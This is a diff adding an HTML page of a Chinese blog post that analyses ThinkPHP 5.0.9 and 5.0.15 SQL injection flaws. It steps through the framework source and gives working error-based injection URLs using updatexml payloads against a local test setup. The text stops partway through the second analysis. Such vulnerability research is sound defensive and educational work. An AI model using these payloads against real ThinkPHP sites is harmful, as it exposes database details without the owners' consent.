@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          ThinkPHP 漏洞分析集合 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/09/ThinkPHP-漏洞分析集合/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#ThinkPHP" title="ThinkPHP">ThinkPHP</a>
+                        
+                    </div>
+                    <h1>ThinkPHP 漏洞分析集合</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-09-24
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="ThinkPHP-5-0-9-鸡肋SQL注入"><a href="#ThinkPHP-5-0-9-鸡肋SQL注入" class="headerlink" title="ThinkPHP 5.0.9 鸡肋SQL注入"></a>ThinkPHP 5.0.9 鸡肋SQL注入</h1><p>虽说鸡肋，但是原理还是很值得深思的，而且也能靠报错获取一手数据库信息。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先从官网下载版本为<code>5.0.9</code>的thinkphp，然后创建一个demo应用，这里直接借鉴的p神vulhub中的代码和数据</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection/www" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection/www</a> （ 不直接用docker环境是为了方便后期调试溯源</p>
+<p>还有一个点就是thinkphp默认是开启debug模式的，就会显示尽可能多的报错信息，也是利用这个才能获取到数据库信息。这个感觉其实也怪不了官网，毕竟本身就是个框架，开发过程中debug是刚需，而且官方手册也一再强调过要在生产环境要关闭debug，即使默认关闭觉得也不缺乏直接debug环境上线的程序员 :dizzy_face:</p>
+<p>再有就是说明一下index.php中的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ids = input(<span class="string">'ids/a'</span>);</span><br><span class="line">    $t = <span class="keyword">new</span> User();</span><br><span class="line">    $result = $t-&gt;where(<span class="string">'id'</span>, <span class="string">'in'</span>, $ids)-&gt;select();</span><br><span class="line">    <span class="keyword">foreach</span>($result <span class="keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hello, &#123;$row['username']&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点在于<code>$ids = input(&#39;ids/a&#39;);</code>，这也是触发漏洞一个关键，至于是什么意思呢可以查看官方手册得到答案</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/1.png" alt></p>
+<p>就是以数组的形式接受参数。</p>
+<p>最后，可以开始真正的攻击了，访问如下url</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost/tp5.0.9/public/index.php?ids</span>[<span class="string">0,updatexml(0,concat(0xa,user()),0)</span>]=1</span><br></pre></td></tr></table></figure>
+<p>即可得到sql语句的报错</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/2.png" alt></p>
+<p>在下面还能报错出数据库的配置信息</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/3.png" alt></p>
+<p>那为什么说鸡肋呢，因为之只能通过报错获取类似于<code>database()</code>、<code>user()</code>这类信息，而不支持子查询</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在一开始下好断点，跟进<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select()</code>语句</p>
+<p>一开始先调用了<code>thinkphp\library\think\db\Query.php:2277</code>的<code>select</code>方法</p>
+<p>然后跟进2306行处的<code>$sql = $this-&gt;builder-&gt;select($options);</code></p>
+<p>然后来到664行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql = str_replace(</span><br><span class="line">        [<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>], $options),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($options[<span class="string">'distinct'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($options[<span class="string">'field'</span>], $options),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($options[<span class="string">'join'</span>], $options),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($options[<span class="string">'where'</span>], $options),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($options[<span class="string">'group'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($options[<span class="string">'having'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($options[<span class="string">'order'</span>], $options),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($options[<span class="string">'limit'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($options[<span class="string">'union'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($options[<span class="string">'lock'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($options[<span class="string">'comment'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($options[<span class="string">'force'</span>]),</span><br><span class="line">        ], <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">    <span class="keyword">return</span> $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这里调用了一次<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $whereStr = <span class="keyword">$this</span>-&gt;buildWhere($where, $options);</span><br><span class="line">	....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进第一行的<code>$whereStr = $this-&gt;buildWhere($where, $options);</code></p>
+<p>然后来到下面的<code>buildWhere</code>函数中，最后进入到282行附近的如下语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 对字段使用表达式查询</span></span><br><span class="line">    $field = is_string($field) ? $field : <span class="string">''</span>;</span><br><span class="line">    $str[] = <span class="string">' '</span> . $key . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseWhereItem($field, $value, $key, $options, $binds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点就在<code>$this-&gt;parseWhereItem</code>中，也就是在这里进行了对<code>in</code>的处理，来看下这个函数</p>
+<p>由于代码太多，只贴一部分重要的相关处理逻辑</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhereItem</span><span class="params">($field, $val, $rule = <span class="string">''</span>, $options = [], $binds = [], $bindName = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	....</span><br><span class="line">    $bindName = $bindName ?: <span class="string">'where_'</span> . str_replace([<span class="string">'.'</span>, <span class="string">'-'</span>], <span class="string">'_'</span>, $field);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\W/'</span>, $bindName)) &#123;</span><br><span class="line">        <span class="comment">// 处理带非单词字符的字段名</span></span><br><span class="line">        $bindName = md5($bindName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	....</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (in_array($exp, [<span class="string">'NOT IN'</span>, <span class="string">'IN'</span>])) &#123;</span><br><span class="line">        <span class="comment">// IN 查询</span></span><br><span class="line">        <span class="keyword">if</span> ($value <span class="keyword">instanceof</span> \Closure) &#123;</span><br><span class="line">            $whereStr .= $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseClosure($value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = is_array($value) ? $value : explode(<span class="string">','</span>, $value);</span><br><span class="line">            <span class="keyword">if</span> (array_key_exists($field, $binds)) &#123;</span><br><span class="line">                $bind  = [];</span><br><span class="line">                $array = [];</span><br><span class="line">                <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query-&gt;isBind($bindName . <span class="string">'_in_'</span> . $k)) &#123;</span><br><span class="line">                        $bindKey = $bindName . <span class="string">'_in_'</span> . uniqid() . <span class="string">'_'</span> . $k;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $bindKey = $bindName . <span class="string">'_in_'</span> . $k;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $bind[$bindKey] = [$v, $bindType];</span><br><span class="line">                    $array[]        = <span class="string">':'</span> . $bindKey;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;query-&gt;bind($bind);</span><br><span class="line">                $zone = implode(<span class="string">','</span>, $array);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $zone = implode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;parseValue($value, $field));</span><br><span class="line">            &#125;</span><br><span class="line">            $whereStr .= $key . <span class="string">' '</span> . $exp . <span class="string">' ('</span> . (<span class="keyword">empty</span>($zone) ? <span class="string">"''"</span> : $zone) . <span class="string">')'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">	....</span><br><span class="line">    <span class="keyword">return</span> $whereStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到一开始其实是对传入的参数进行了正则匹配处理的，但是由于传入的是一个数组，也就绕过了这个匹配</p>
+<p>可以看到之后就将数组中的值遍历出来，然后将key值拼接到SQL语句中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/4.png" alt></p>
+<p>最终的<code>$whereStr</code>值为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`id` IN (:where_id_in_0,updatexml(0,concat(0xa,user()),0))</span><br></pre></td></tr></table></figure>
+<p>从而导致在编译SQL语句的时候发生错误，从而产生报错。</p>
+<p>这也就意味着我们控制了PDO预编译过程中的键名，这里有个疑问就是为什么不能用子查询呢？</p>
+<p>引用下p神的文章 <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>
+<blockquote>
+<p>通常，PDO预编译执行过程分三步：</p>
+<ol>
+<li><code>prepare($SQL)</code> 编译SQL语句</li>
+<li><code>bindValue($param, $value)</code> 将value绑定到param的位置上</li>
+<li><code>execute()</code> 执行</li>
+</ol>
+<p>这个漏洞实际上就是控制了第二步的<code>$param</code>变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的。</p>
+<p>但实际上，在预编译的时候，也就是第一步即可利用。</p>
+<p>究其原因，是因为我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。</p>
+<p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后<code>execute()</code>的时候才发送给数据库执行；如果我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p>
+<p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p>
+<p>这时，假设在第一步执行<code>prepare($SQL)</code>的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。</p>
+</blockquote>
+<p>在ThinkPHP中也能明显看到<code>PDO::ATTR_EMULATE_PREPARES</code>这个选项是默认关闭的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PDO连接参数</span></span><br><span class="line"><span class="keyword">protected</span> $params = [</span><br><span class="line">    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,</span><br><span class="line">    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,</span><br><span class="line">    PDO::ATTR_STRINGIFY_FETCHES =&gt; <span class="keyword">false</span>,</span><br><span class="line">    PDO::ATTR_EMULATE_PREPARES  =&gt; <span class="keyword">false</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+<p>这样，在执行预编译的编译SQL语句阶段mysql就会报错，但并没有与数据交互，所以只能爆出类似于<code>user()</code>、<code>database()</code>这类最基础的信息，而不能进行子查询。</p>
+<p>最后，膜一下p神对于这种底层机制的深入研究，从最根本的原理层面去剖析这种问题。</p>
+<p>关于这个漏洞可以触发的点除了<code>in</code>还有一些例如<code>like</code>、<code>not like</code>、<code>not in</code></p>
+<p>框架采用的PDO机制可以说从根本上已经解决了一大堆SQL方面的安全问题，但往往有时就是对安全的过于信任，导致这里是在参数绑定的过程中产生了注入，不过PDO也可以说是将危害降到了最小。</p>
+<h1 id="ThinkPHP-5-0-15-update-insert-注入"><a href="#ThinkPHP-5-0-15-update-insert-注入" class="headerlink" title="ThinkPHP 5.0.15 update/insert 注入"></a>ThinkPHP 5.0.15 update/insert 注入</h1><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>从官网下载<code>ThinkPHP5.0.15</code>，在<code>application/index/controller/Index.php</code>中插入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $username = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">    $res = db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>依旧是以数组的形式接受参数</p>
+<p>然后创建一个简单的<code>user</code>表</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/5.png" alt></p>
+<p>然后在<code>database.php</code>配置好数据库信息，最后打在<code>congfig.php</code>中将<code>app_debug</code>开为<code>true</code>。（应该是前一个5.0.9的漏洞原因修改了默认设置吧</p>
+<p>最后访问如下url，即可产生sql注入（虽然还是鸡肋型的</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/tp5.0.15/public/index.php</span></span><br><span class="line">?username[<span class="number">0</span>]=inc</span><br><span class="line"><span class="variable">&amp;username</span>[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="variable">&amp;username</span>[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/6.png" alt></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>$res = db(&#39;user&#39;)-&gt;where([&#39;id&#39;=&gt; 1])-&gt;insert([&#39;username&#39;=&gt;$username]);</code>下好断点后进入</p>
+<p>跟随到<code>insert</code>函数中<code>thinkphp/library/think/db/Query.php:2079</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 分析查询表达式</span></span><br><span class="line">    $options = <span class="keyword">$this</span>-&gt;parseExpress();</span><br><span class="line">    $data    = array_merge($options[<span class="string">'data'</span>], $data);</span><br><span class="line">    <span class="comment">// 生成SQL语句</span></span><br><span class="line">    $sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
+<p>跟进<code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code></p>
+<p>然后跟进到第一行的<code>$data = $this-&gt;parseData($data, $options);</code>中看看是如何解析数据的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取绑定信息</span></span><br><span class="line">    $bind = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind($options[<span class="string">'table'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> == $options[<span class="string">'field'</span>]) &#123;</span><br><span class="line">        $fields = array_keys($bind);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $fields = $options[<span class="string">'field'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</span><br><span class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 对象数据写入</span></span><br><span class="line">            $val = $val-&gt;__toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">		....</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</span><br><span class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</span><br><span class="line">                    $result[$item] = $val[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($val)) &#123;</span><br><span class="line">		....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对传入的<code>$data</code>变量进行遍历，当<code>$val[0]==&#39;inc&#39;</code>时，就会将<code>$val[1]</code>与<code>$val[2]</code>拼接</p>
